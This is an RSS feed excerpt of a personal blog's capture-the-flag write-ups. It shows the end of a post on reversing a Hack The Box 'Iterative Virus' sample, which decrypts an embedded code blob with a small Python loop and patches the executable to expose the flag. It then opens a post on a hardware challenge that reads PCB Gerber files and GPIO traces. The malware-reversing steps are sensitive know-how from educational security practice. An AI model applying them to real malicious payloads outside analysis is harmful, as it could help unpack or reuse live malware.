&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">result&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">end&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\n\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">decrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">key&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">code&lt;/span>&lt;span class="p">)):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">code&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">code&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">key&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="mh">0xFFFFFFFFFFFFFFFF&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">decrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">KEY_1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">decrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">KEY_2&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">decrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">KEY_3&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">decrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">KEY_4&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">print_blob&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">code&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Attempting to analyze this decrypted code didn&amp;rsquo;t yield any results, so I figured it required the context of the full program to work successfully.
At this point I used &lt;code>HxD&lt;/code> to patch the virus exe to overwrite the encrypted code with the decrypted one.
Then I opened it in IDA and saw that the decrypted code was also resolving more functions dynamically, although these function&amp;rsquo;s aren&amp;rsquo;t too important as the flag is visible in plaintext at this point.
The functions would open up a message box containing the flag value I think.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-iterative-virus/img/img_8.PNG"
width="908"
height="508"
srcset="https://Kvn11.github.io/p/htb-iterative-virus/img/img_8_hub606f63516ba7f29a44885b8f590a99b_47164_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-iterative-virus/img/img_8_hub606f63516ba7f29a44885b8f590a99b_47164_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Flag"
class="gallery-image"
data-flex-grow="178"
data-flex-basis="428px"
>&lt;/p>
&lt;h2 id="lessons-learned">Lessons Learned
&lt;/h2>&lt;p>I spent much more time on this challenge than I should have.
A lot of time was wasted on reversing the exact infection process and seeing what fields were being changed in the headers of the victim file.
I should have focused on the decryption portion and the code surrounding that instead.
All in all, I think for next time I should focus less on the details and more so on the &amp;ldquo;bigger picture&amp;rdquo; of what the application is doing.&lt;/p></description></item><item><title>HTB HW Challenge Trace</title><link>https://Kvn11.github.io/p/htb-hw-challenge-trace/</link><pubDate>Wed, 10 May 2023 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/htb-hw-challenge-trace/</guid><description>&lt;img src="https://Kvn11.github.io/p/htb-hw-challenge-trace/img/hackthebox.jpg" alt="Featured image of post HTB HW Challenge Trace" />&lt;blockquote>
&lt;p>&lt;strong>Challenge Description&lt;/strong>: One of our embedded devices has been compromised.
It was flashing a message on the debug matrix that was too fast to read, although we managed to capture one iteration of it.
We must find out what was displayed.
To help you with your mission, we will also provide you with the fabrication files of the PCB module the matrix was on.&lt;/p>
&lt;/blockquote>
&lt;h2 id="walkthrough">Walkthrough
&lt;/h2>&lt;p>The zip files contains a Gerber module, as well as a &lt;code>.csv&lt;/code> containing what seems to be the outputs of different &lt;code>GPIO&lt;/code> pins, as well as the time they were recorded.&lt;/p>
&lt;p>Having never really worked with a Gerber module before I had to do research to figure out its importance and usage.&lt;/p>
&lt;p>Gerber describes the elements of a printed circuit board (PCB).
It is used for both the fabrication of the board, and its assembly.
A quick google search tells me that I can open the files using &lt;code>gerbv&lt;/code>.
For some reason, the window would go black whenever I tried importing the &lt;code>.DRL&lt;/code> files, so I excluded those. However, this is the final result:&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-hw-challenge-trace/img/img_1.png"
width="1441"
height="740"
srcset="https://Kvn11.github.io/p/htb-hw-challenge-trace/img/img_1_hu820b72062c5204bbc53581002d8f17d9_114984_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-hw-challenge-trace/img/img_1_hu820b72062c5204bbc53581002d8f17d9_114984_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Gerber File"
class="gallery-image"
data-flex-grow="194"
data-flex-basis="467px"
>&lt;/p>
&lt;p>There is a term &lt;code>Common Anode Matrix&lt;/code> that I have never heard of before, as well as the MCU on the board being a &lt;code>Raspberry Pi 3b+ Hat&lt;/code>.
ChatGPT reveals that a common anode matrix is simply a grid of LED&amp;rsquo;s, and specific LED&amp;rsquo;s are supplied voltage to create images, letters, or numbers.
Based on this, I can assume that the flag is flashing on the matrix, and I need to map the outputs of the &lt;code>.csv&lt;/code> file to its LED on the board.
I was able to find the following image online which nicely displays the pinout of the Raspberry Pi:&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-hw-challenge-trace/img/img_2.png"
width="793"
height="599"
srcset="https://Kvn11.github.io/p/htb-hw-challenge-trace/img/img_2_hu9b85b2e9e8cc4f23a1927997bb71a49c_793112_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-hw-challenge-trace/img/img_2_hu9b85b2e9e8cc4f23a1927997bb71a49c_793112_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Pinout"
class="gallery-image"
data-flex-grow="132"
data-flex-basis="317px"
>&lt;/p></description></item></channel></rss>